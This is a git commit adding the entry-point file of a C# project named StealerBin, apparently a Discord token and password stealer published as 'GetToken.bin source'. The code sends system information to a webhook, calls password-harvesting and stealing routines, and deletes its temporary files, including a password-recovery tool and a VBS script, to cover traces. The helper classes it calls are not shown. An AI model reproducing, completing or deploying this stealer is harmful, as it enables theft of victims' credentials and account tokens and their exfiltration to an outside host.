5d13259605d86cba5f0498056a6a4bf86b037d35
Itroublve <51215044+Itroublve@users.noreply.github.com>
2020-07-28 18:16:49 +0200

    GetToken.bin source

---
+++ GetToken/StealerBin/Hook.cs
@@ -0,0 +1,23 @@
+﻿using System;
+using System.IO;
+
+namespace StealerBin
+{
+	internal class Hook
+	{
+		private static void Main(string[] args)
+		{
+            new API(API.Hook)
+            {
+                _name = API.name,
+                _ppUrl = API.pfp
+            }.SendSysInfo("**SYSTEM INFO**", "C:/temp/System_INFO.txt");
+            File.Delete("C:/temp/System_INFO.txt");
+            File.Delete("C:/temp/finalres.vbs");
+            File.Delete("C:/temp/WebBrowserPassView.exe");
+            API.Passwords();
+            Stealer.StartSteal();
+            Environment.Exit(0);
+		}
+	}
+}
